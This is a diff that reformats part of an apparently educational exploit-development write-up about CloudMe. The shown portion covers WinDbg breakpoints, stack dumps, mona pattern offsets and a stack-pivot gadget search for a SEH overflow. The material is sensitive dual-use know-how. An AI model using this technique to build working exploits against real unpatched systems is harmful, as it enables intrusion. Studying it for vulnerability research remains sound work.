@@ -709,24 +709,31 @@ except Exception as e:
   print(sys.exc_value)
 ```
 
-
 <p align="justify">The following address <b>0x6d9c1011</b> was selected with the only purpose of setting a breakpoint in order to calculate <b>ESP</b> relative offset once we hit it. At this point we use the first 2236 bytes to get to <b>SEH</b>.</p>
-<pre>0:000&gt; bp 0x6d9c1011
+
+```
+0:000> bp 0x6d9c1011
 *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll - 
-0:000&gt; bl 
+0:000> bl 
  0 e 6d9c1011     0001 (0001)  0:**** Qt5Sql+0x1011
-</pre>
+```
+
 <p align="justify">Following, we load the payload and continue execution until we hit the breakpoint</p>
-<pre>0:000&gt; g
+
+```
+0:000> g
 Breakpoint 0 hit
 eax=00000000 ebx=00000000 ecx=6d9c1011 edx=779e71cd esi=00000000 edi=00000000
 eip=6d9c1011 esp=0022cf18 ebp=0022cf38 iopl=0         nv up ei pl zr na pe nc
 cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
 Qt5Sql+0x1011:
 6d9c1011 c3              ret
-</pre>
+```
+
 <p align="justify">As we see above, after hitting the breakpoint, the <b>ESP</b> is pointing to <b>0x0022cf18</b>. Now lets look at the stack to locate the beginning of the payload. In order to search for the beginning of the payload we will use the <b>ESP</b> value at the time of crash which is <b>0x0022d470</b> .After looking throughout the stack we have located the beginning of the payload at the following location (<b>0x0022d050</b>):</p>
-<pre>0:000&gt; dd 0022d470-500 L 50 
+
+```
+0:000&gt; dd 0022d470-500 L 50 
 0022cf70  00000000 00987898 00000000 00000000
 0022cf80  04ace4d8 047e19d8 00000001 00000162
 0022cf90  00000000 01003630 00000000 00000710
@@ -761,13 +768,19 @@ Looking for A0aA in pattern of 500000 bytes
  - Pattern A0aA not found in cyclic pattern (lowercase)  
 
 [+] This mona.py action took 0:00:00.438000
-</pre>
+```
+
 <p align="justify">As we can see from the execution above, the pattern was found at position 0. Furthermore, the address <b>0x0022d470</b> we've got at the time of crash, appears to be <b>1368</b> bytes away from <b>ESP</b> when hitting the breakpoint.</p>
-<pre>0:000&gt; ? 0022d470 - esp
+
+```
+0:000> ? 0022d470 - esp
 Evaluate expression: 1368 = 00000558
-</pre>
+```
+
 <p align="justify">So ideally, we need to find a gadget equivalent to <b>ADD ESP 558 ...POP ...POP ...RETN</b> to pivot precisely to the beginning of the payload. Nevertheless, any gadget with distance above &gt;1368 bytes will suit us. Next, in order to find a suitable stack pivot, we will use mona’s <strong>stackpivot</strong> searching functionality. At this point we will load CloudMe executable in <strong>WinDBG</strong> and then run the following command</p>
-<pre>0:000&gt; !py mona stackpivot -n -o -distance 1368
+
+```
+0:000> !py mona stackpivot -n -o -distance 1368
 Hold on...
 [+] Command used:
 !py C:\Program Files\Windows Kits\8.0\Debuggers\x86\mona.py stackpivot -n -o -distance 1368
@@ -847,7 +860,8 @@ Hold on...
 Done
 
 [+] This mona.py action took 0:17:32.653000
-</pre>
+```
+
 <p align="justify">After a few minutes, mona will generate <b>stackpivot.txt</b> file in its output directory. Here is one gadget that will send us to the beginning of the payload</p>
 <pre>Stack pivots, minimum distance 1368
 -------------------------------------
